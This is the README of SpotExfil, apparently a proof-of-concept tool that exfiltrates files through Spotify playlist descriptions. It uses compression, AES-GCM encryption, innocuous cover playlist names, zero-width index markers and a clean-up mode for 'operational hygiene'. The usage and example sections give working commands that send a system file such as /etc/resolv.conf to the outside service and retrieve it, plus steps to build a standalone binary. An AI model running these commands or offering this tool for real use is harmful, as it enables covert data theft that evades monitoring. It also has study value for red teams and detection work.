[![CodeQL](https://github.com/sourcefrenchy/spotexfil/actions/workflows/codeql-analysis.yml/badge.svg)](https://github.com/sourcefrenchy/spotexfil/actions/workflows/codeql-analysis.yml)

# SpotExfil

A proof-of-concept covert channel that exfiltrates data through Spotify playlist descriptions, 512 characters at a time.

More info at [Exfiltration Series: SpotExfil](https://medium.com/@jeanmichel.amblat/exfiltration-series-spotexfil-9aee76382b74)

## How It Works

```
                    SPOTIFY API
                   (OAuth + REST)
                   /            \
            SENDER              RECEIVER
              |                     |
        +-----------+        +-----------+
        | File      |        | Reassemble|
        | -> Gzip   |        | -> Decrypt|
        | -> BLAKE2b|        | -> Verify |
        | -> AES-GCM|        | -> Decomp |
        | -> Base64 |        | -> Output |
        | -> Chunk  |        +-----------+
        +-----------+
```

1. **Compress**: Gzip the file (skipped automatically if no benefit)
2. **Encode**: Compute BLAKE2b integrity hash, encrypt with AES-256-GCM, Base64-encode, wrap in JSON
3. **Chunk**: Split payload into 512-character pieces (Spotify playlist description limit)
4. **Transmit**: Create private playlists with innocuous cover names, embed payload in descriptions, add filler tracks from random artists
5. **Retrieve**: Fetch playlists, sort by hidden index metadata, reassemble, decrypt, decompress, verify integrity hash

## Features

- **AES-256-GCM encryption** with PBKDF2-SHA256 key derivation (480K iterations)
- **Gzip compression** reduces payload size 60-80% for text (auto-skipped for incompressible data)
- **BLAKE2b integrity verification** on encode and decode
- **Stealth playlist naming** using innocuous cover names (e.g., "Chill Vibes #a3f2") with hidden index metadata via zero-width space markers
- **Random filler tracks** from a pool of 7 artists per playlist
- **Paginated playlist handling** (no 50-playlist limit)
- **Config file support** (`~/.spotexfil.conf`) so env vars are optional
- **Standalone executable** via PyInstaller (no Python environment needed)
- **`--clean` flag** for operational hygiene (wipe payloads without sending)
- **Legacy mode** (plaintext Base64 + `N-payloadChunk` naming) for backward compatibility

## Prerequisites

1. Register an app at [Spotify Developer Dashboard](https://developer.spotify.com/dashboard/)
2. Add your redirect URI in the app settings (e.g., `http://127.0.0.1:8888/callback`)
3. Provide credentials via **environment variables** or **config file**:

### Option A: Environment Variables

```bash
export SPOTIFY_USERNAME=YourSpotifyUsername
export SPOTIFY_CLIENT_ID=your_client_id
export SPOTIFY_CLIENT_SECRET=your_client_secret
export SPOTIFY_REDIRECTURI=http://127.0.0.1:8888/callback
```

### Option B: Config File

Create `~/.spotexfil.conf`:

```ini
[spotify]
username = YourSpotifyUsername
client_id = your_client_id
client_secret = your_client_secret
redirect_uri = http://127.0.0.1:8888/callback
```

Environment variables take precedence over config file values.

## Installation

### From source

```bash
pip install -r requirements.txt
```

### Standalone executable (no Python needed)

```bash
pip install pyinstaller
pyinstaller --onefile spotexfil.py
# Binary at: dist/spotexfil
```

For development (tests + linting):

```bash
pip install -r requirements-dev.txt
```

## Usage

### Unified CLI (`spotexfil.py` / standalone binary)

```bash
# Send (encrypted + compressed, cover names)
./spotexfil.py send -f /etc/resolv.conf -k "my-passphrase"

# Send (legacy naming, no compression)
./spotexfil.py send -f payload.txt -k "key" --legacy-names --no-compress

# Receive and decrypt
./spotexfil.py receive -k "my-passphrase"

# Receive and save to file
./spotexfil.py receive -k "my-passphrase" -o output.txt

# Clean up all payload playlists
./spotexfil.py clean
```

### Legacy CLI (separate scripts)

```bash
# Send
./spotexfil_client.py -f /etc/resolv.conf -k "my-passphrase"

# Receive
./spotexfil_retrieve.py -r -k "my-passphrase"

# Clean only
./spotexfil_client.py --clean
```

### Example

```
$ ./spotexfil.py send -f /etc/resolv.conf -k "demo-key"
[*] Data cleared (0 playlists removed)
[*] checksum plaintext 5673f6cea5b33041f92eab6f62a2b348a12f5d0d
[*] original size: 256 bytes
[*] compressed: 198 bytes (saved 23%)
[*] payload encrypted with AES-256-GCM
[*] Generating playlists
    [*] Created [1/1] Chill Vibes #f7a2 (312 chars)
[*] Data encoded and sent (1 playlists)

$ ./spotexfil.py receive -k "demo-key"
[*] Retrieving playlists
    [*] Retrieved chunk 1: Chill Vibes #f7a2
[*] Retrieved 1 chunks
[*] integrity verified: 5673f6cea5b33041f92eab6f62a2b348a12f5d0d
# macOS Notice
# This file is not consulted for DNS hostname resolution...
```

## Testing

```bash
# Run all tests (84 tests)
pytest tests/ -v

# Run with coverage
pytest tests/ --cov=. --cov-report=term-missing

# Lint
flake8 *.py tests/*.py
```

Test suite covers:
- **Unit tests**: BLAKE2b, AES-256-GCM, key derivation, compression, Base64
- **API tests**: Auth, config file loading, pagination, cover names, playlist CRUD (mocked)
- **Integration tests**: Full roundtrips with compression, encryption, cover names, ordering

## Project Structure

```
spotexfil/
├── spotexfil.py             # Unified CLI (send/receive/clean subcommands)
├── spotexfil_client.py      # Legacy CLI: exfiltrate a file
├── spotexfil_retrieve.py    # Legacy CLI: retrieve exfiltrated data
├── spotapi.py               # Spotify API wrapper (auth, config, playlists, cover names)
├── encoding.py              # Compression, encryption, encoding, integrity
├── requirements.txt         # Runtime dependencies (spotipy, cryptography)
├── requirements-dev.txt     # Dev/test dependencies
├── setup.cfg                # flake8 + pytest config
└── tests/
    ├── test_encoding.py     # Unit tests for encoding/crypto/compression
    ├── test_spotapi.py      # Mock-based API + config + cover name tests
    └── test_integration.py  # End-to-end roundtrip tests
```

## Limitations

- **~1MB max payload** (~2000 playlists before Spotify limits)
- **Slow for large files** (1 API call per 512-character chunk)
- **Spotify rate limits** may throttle bulk operations

## Disclaimer

This is a **proof-of-concept for educational and authorized security research purposes only**. Do not use this tool for unauthorized data exfiltration. The author is not responsible for misuse.

## TODO

- Account rotation support
- Real-time listener mode (chat system via `spotexfil_server.py`)
